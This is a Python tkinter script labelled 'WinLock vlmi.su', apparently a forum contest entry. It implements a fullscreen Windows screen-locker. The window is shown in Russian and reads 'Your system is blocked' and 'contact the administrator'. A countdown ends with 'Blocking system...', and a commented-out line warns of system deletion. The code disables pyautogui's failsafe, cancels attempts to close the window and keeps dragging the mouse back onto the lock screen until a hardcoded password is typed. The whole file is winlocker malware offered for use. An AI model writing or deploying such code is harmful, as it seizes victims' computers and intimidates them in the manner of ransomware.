import pyautogui  
from tkinter import *  


read1ng=" " 
password=("1234") 
t1me=7200 
d3l="Блокировка системы..." 

def block(): 
    pyautogui.click(x=675,y=405) 
    pyautogui.moveTo(x=675,y=405) 
    screen.protocol("WM_DELETE_WINDOW",block) 
    screen.update() 

def password_check(event): 
    global read1ng 
    read1ng=field.get() 
    if read1ng==password: 
        screen.destroy()  

screen=Tk() 
screen.title("WinLock vlmi.su")
screen.attributes("-fullscreen",True) 
screen.configure(background="#1c1c1c") 
pyautogui.FAILSAFE=False 


field=Entry(screen,fg="green",justify=CENTER)  
but=Button(screen,text="Разблокировать")
text0=Label(screen,text="Ваша система заблокирована!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c") 
#text=Label(screen,text="Danaforevr для конкурса VLMI.SU",font="TimesNewRoman 30",fg="#32CD32",bg="#1c1c1c") 
text1=Label(screen,text="Для разблокировки системы обратитесь к администратору",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c")
l=Label(text=t1me,font="Arial 22",fg="red",bg="#1c1c1c") 
#l1=Label(text="До удаления системы осталось:",fg="white",bg="#1c1c1c",font="Arial 15") #простая надпись как и выше

but.bind('<Button-1>',password_check)
#text.place(x=380,y=180) #переменную text мы отображаем на координатах X и Y
field.place(width=150,height=50,x=600,y=300) 
but.place(width=150,height=50,x=600,y=380) 
text0.place(x=410,y=100) 
text1.place(x=410,y=250) 

#-----------------------------------------------------
screen.update() 
pyautogui.click(x=675,y=325) 
pyautogui.moveTo(x=660,y=410)

while read1ng!=password:
    l.configure(text=t1me) 
    screen.after(300) 
    if t1me==0: 
        t1me=d3l 

    if t1me!=d3l:
        t1me=t1me-1 
    block() 


